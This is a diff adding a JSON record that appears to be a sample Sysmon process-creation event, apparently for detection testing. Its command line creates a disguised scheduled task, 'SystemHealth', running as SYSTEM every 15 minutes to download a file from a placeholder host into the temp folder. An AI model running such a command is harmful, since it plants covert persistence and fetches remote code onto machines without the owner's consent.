@@ -1,0 +1,8 @@
+{
+  "EventID": 1,
+  "UtcTime": "2026-09-03 13:40:35.000",
+  "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+  "Image": "C:\\Windows\\System32\\schtasks.exe",
+  "CommandLine": "schtasks.exe /create /tn \"SystemHealth\" /tr \"cmd.exe /c curl.exe https://cdn.stage.invalid/p.bin -o %TEMP%\\p.exe\" /sc minute /mo 15",
+  "User": "NT AUTHORITY\\SYSTEM"
+}
